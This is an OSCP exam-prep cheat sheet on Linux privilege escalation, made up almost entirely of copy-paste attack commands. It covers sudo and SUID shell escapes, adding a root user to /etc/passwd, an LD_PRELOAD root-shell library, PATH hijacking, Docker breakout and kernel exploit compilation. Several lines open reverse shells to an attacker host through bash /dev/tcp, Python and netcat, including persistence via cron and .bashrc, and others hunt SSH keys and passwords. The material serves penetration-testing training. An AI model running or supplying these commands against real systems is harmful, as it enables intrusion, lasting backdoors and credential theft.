# OSCP Linux Privilege Escalation Master Guide

## Table of Contents
- [Initial Enumeration](#initial-enumeration)
- [Automated Scripts](#automated-scripts)
- [Manual Enumeration](#manual-enumeration)
- [Privilege Escalation Techniques](#privilege-escalation-techniques)
- [Post-Exploitation](#post-exploitation)
- [Common Mistakes](#common-mistakes)

## Initial Enumeration

### Basic System Information (Copy-Paste Ready)
```bash
# Current user and groups
id
whoami
groups

# System information
uname -a
hostname
cat /etc/os-release
cat /etc/issue
cat /etc/*-release

# Network configuration
ip a
ifconfig
ip route
route -n
netstat -tulpn
ss -tulpn

# Environment variables
env
echo $PATH
echo $USER
echo $HOME
```

### User and Permission Enumeration
```bash
# All users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Users with shell access
cat /etc/passwd | grep -v nologin | grep -v false
awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/bin/false") {print $1}' /etc/passwd

# Check sudo permissions
sudo -l

# Groups and group memberships
cat /etc/group
groups $USER

# Check for writable home directories
ls -la /home/
```

### Process and Service Enumeration
```bash
# Running processes
ps aux
ps -ef
ps -eo pid,user,group,command

# Process tree
pstree -p

# Services (systemd)
systemctl list-unit-files --type=service --state=enabled
systemctl list-units --type=service --state=running

# Services (SysV)
service --status-all
ls -la /etc/init.d/

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
ls -la /var/spool/cron/
cat /var/log/cron*
```

## Automated Scripts

### LinPEAS (Recommended)
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Alternative download methods
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Run from memory (if curl is available)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Transfer from attacker machine
python3 -m http.server 8000  # On attacker
wget http://<attacker-ip>:8000/linpeas.sh  # On target
```

### LinEnum
```bash
# Download and run
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# Thorough scan
./LinEnum.sh -t
```

### Linux Smart Enumeration (LSE)
```bash
# Download and run
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh

# Levels: 0 (least verbose) to 2 (most verbose)
./lse.sh -l1
./lse.sh -l2
```

### pspy (Process Monitoring)
```bash
# Download appropriate version (32 or 64 bit)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64

# Monitor filesystem events
./pspy64 -f
```

## Manual Enumeration

### File System Enumeration
```bash
# SUID files (may run as owner)
find / -type f -perm -4000 2>/dev/null
find / -type f -perm -u+s 2>/dev/null

# SGID files (may run as group owner)
find / -type f -perm -2000 2>/dev/null
find / -type f -perm -g+s 2>/dev/null

# World-writable files
find / -type f -perm -o+w 2>/dev/null
find / -type f -perm -002 2>/dev/null

# World-writable directories
find / -type d -perm -o+w 2>/dev/null

# Files owned by current user
find / -type f -user $(whoami) 2>/dev/null

# Recently modified files (last 24 hours)
find / -type f -mtime -1 2>/dev/null

# Configuration files
find /etc -type f -name "*.conf" 2>/dev/null
find /etc -type f -name "*.config" 2>/dev/null

# Log files
find /var/log -type f 2>/dev/null
ls -la /var/log/
```

### Interesting Files and Directories
```bash
# Check common directories
ls -la /opt/
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/
ls -la /var/backups/
ls -la /var/mail/
ls -la /var/spool/

# User directories
ls -la /home/
ls -la /root/
ls -la ~/.ssh/
ls -la ~/.bash_history
ls -la ~/.bashrc
ls -la ~/.profile

# Web directories (if web server present)
ls -la /var/www/
ls -la /var/www/html/
ls -la /usr/share/nginx/html/
ls -la /opt/lampp/htdocs/

# Database files
find / -name "*.db" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
find / -name "*.sql" 2>/dev/null
```

### Network Enumeration
```bash
# Network interfaces
ip a
cat /proc/net/arp

# Network connections
netstat -tulpn
ss -tulpn

# Routing table
ip route
route -n

# DNS settings
cat /etc/resolv.conf

# Hosts file
cat /etc/hosts

# Network shares (NFS)
showmount -e localhost
cat /etc/exports
```

### Installed Software
```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RedHat/CentOS
rpm -qa
yum list installed

# Package managers
which apt apt-get yum dnf pacman snap flatpak pip pip3

# Development tools
which gcc g++ make python python3 perl ruby java javac
```

## Privilege Escalation Techniques

### 1. Sudo Misconfiguration
```bash
# Check sudo permissions
sudo -l

# Common sudo misconfigurations:

# 1. ALL=(ALL) NOPASSWD: ALL
sudo su -

# 2. Specific binary allowed
# If you can run vim with sudo:
sudo vim
:set shell=/bin/bash
:shell

# If you can run less/more with sudo:
sudo less /etc/passwd
!/bin/bash

# If you can run find with sudo:
sudo find /etc/passwd -exec sh \;

# If you can run awk with sudo:
sudo awk 'BEGIN {system("/bin/bash")}'

# If you can run python with sudo:
sudo python -c "import os; os.system('/bin/bash')"

# GTFOBins has comprehensive list of sudo bypasses
```

### 2. SUID Binaries
```bash
# Find SUID binaries
find / -type f -perm -4000 2>/dev/null

# Common SUID escalations:

# find (rare but exists)
find . -exec /bin/sh -p \; -quit

# vim/nano (if SUID)
vim.tiny
:set shell=/bin/sh
:shell

# cp (copy /etc/passwd, modify, copy back)
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$6$salt$hash:0:0:root:/root:/bin/bash' >> /tmp/passwd.bak  
cp /tmp/passwd.bak /etc/passwd

# Custom SUID binaries - check with strings
strings /path/to/suid-binary
```

### 3. Kernel Exploits
```bash
# Get kernel version and OS info
uname -a
cat /etc/os-release
cat /proc/version

# Search for kernel exploits
searchsploit linux kernel $(uname -r)
searchsploit ubuntu $(lsb_release -rs)

# Common kernel exploits:
# - DirtyCow (CVE-2016-5195)
# - Ubuntu 16.04 - 8.3.0 (CVE-2017-16995)
# - Ubuntu 14.04/16.04 (CVE-2017-1000112)

# Compile exploits (if gcc available)
gcc exploit.c -o exploit
./exploit
```

### 4. Cron Jobs
```bash
# Check cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*
cat /var/log/cron*

# Check for writable cron scripts
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/  
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Monitor running processes (use pspy)
./pspy64

# If you find writable cron script:
echo '#!/bin/bash' > /path/to/script.sh
echo '/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' >> /path/to/script.sh
chmod +x /path/to/script.sh
```

### 5. Writable /etc/passwd
```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hacker hacker123

# Add user to /etc/passwd
echo 'hacker:$1$hacker$TzyKlv07KzHnVMCd8p.8N1:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su hacker
```

### 6. Path Hijacking
```bash
# Check PATH
echo $PATH

# If . is in PATH or writable directory in PATH
# Create malicious binary with same name as legitimate one
cd /tmp
echo '#!/bin/bash' > ls
echo '/bin/bash -p' >> ls
chmod +x ls
export PATH=/tmp:$PATH

# When legitimate program calls 'ls', our version runs
```

### 7. Capabilities
```bash
# Check file capabilities  
getcap -r / 2>/dev/null

# Common capability escalations:
# cap_setuid+ep allows changing UID
# cap_dac_override+ep bypasses file permissions
# cap_fowner+ep bypasses file ownership checks

# Example: python with cap_setuid
# /usr/bin/python3 = cap_setuid+ep
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

### 8. NFS Shares
```bash
# Check for NFS exports
showmount -e <target>
cat /etc/exports

# Look for no_root_squash
# If no_root_squash is set, create SUID binary on NFS share

# On attacker (as root):
mkdir /mnt/nfs
mount -t nfs <target>:/share /mnt/nfs
cd /mnt/nfs
cp /bin/bash .
chmod +s bash

# On target:
cd /share
./bash -p
```

### 9. Environment Variables
```bash
# Check environment
env
echo $LD_PRELOAD
echo $LD_LIBRARY_PATH

# LD_PRELOAD exploitation
# Create malicious shared library
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
export LD_PRELOAD=/tmp/shell.so

# Run SUID binary
/usr/bin/suid-binary
```

### 10. Docker Breakout
```bash
# Check if inside container
ls -la /.dockerenv
cat /proc/1/cgroup

# If docker socket is mounted
ls -la /var/run/docker.sock

# If in docker group
id | grep docker

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Post-Exploitation

### Persistence
```bash
# Add SSH key
mkdir -p ~/.ssh
echo '<your-public-key>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Create new user
sudo useradd -m -s /bin/bash hacker
sudo echo 'hacker:hacker123' | chpasswd
sudo usermod -aG sudo hacker

# Cron persistence
echo '*/5 * * * * /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' | crontab -

# Startup script
echo '/bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' >> ~/.bashrc
```

### Information Gathering
```bash
# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# History files
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.python_history

# Configuration files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "pass" /var/www/ 2>/dev/null
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

## Common Mistakes

### 1. Not Checking Sudo Permissions
❌ Forgetting to run `sudo -l`
✅ Always check sudo permissions first - many boxes have sudo misconfigurations

### 2. Missing Obvious SUID Binaries
❌ Not running SUID enumeration
✅ Always run `find / -type f -perm -4000 2>/dev/null`

### 3. Ignoring Automated Scripts
❌ Only doing manual enumeration
✅ Run LinPEAS first, then investigate findings manually

### 4. Not Monitoring Processes  
❌ Static enumeration only
✅ Use pspy to watch for periodic processes and cron jobs

### 5. Forgetting about Capabilities
❌ Only checking SUID and sudo
✅ Check file capabilities with `getcap -r / 2>/dev/null`

## Essential Commands Quick Reference

### File Transfer
```bash
# Python web server (on attacker)
python3 -m http.server 8000

# Download files
wget http://<attacker-ip>:8000/file
curl -O http://<attacker-ip>:8000/file

# Base64 transfer (small files)
base64 file.txt    # On attacker
echo 'base64-string' | base64 -d > file.txt    # On target
```

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/bash <attacker-ip> 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker-ip> 4444 >/tmp/f
```

### Spawn TTY Shell
```bash
# Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Echo
echo os.system('/bin/bash')

# Script
script -qc /bin/bash /dev/null

# Full interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z (background)
stty raw -echo; fg
# Enter twice
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```

## Time-Saving One-Liners

### Quick SUID Check
```bash
find / -type f -perm -4000 2>/dev/null | grep -v snap | grep -v proc
```

### Quick Writable Directory Check
```bash
find / -type d -writable 2>/dev/null | grep -v proc | grep -v sys
```

### Quick Capability Check
```bash
getcap -r / 2>/dev/null | grep -v " ="
```

### Password Hunt
```bash
grep -r "password\|pass\|pwd" /etc/ 2>/dev/null | grep -v Binary
```

Remember: Always run LinPEAS first for comprehensive enumeration, but understand the manual techniques for when automated tools aren't available or are detected!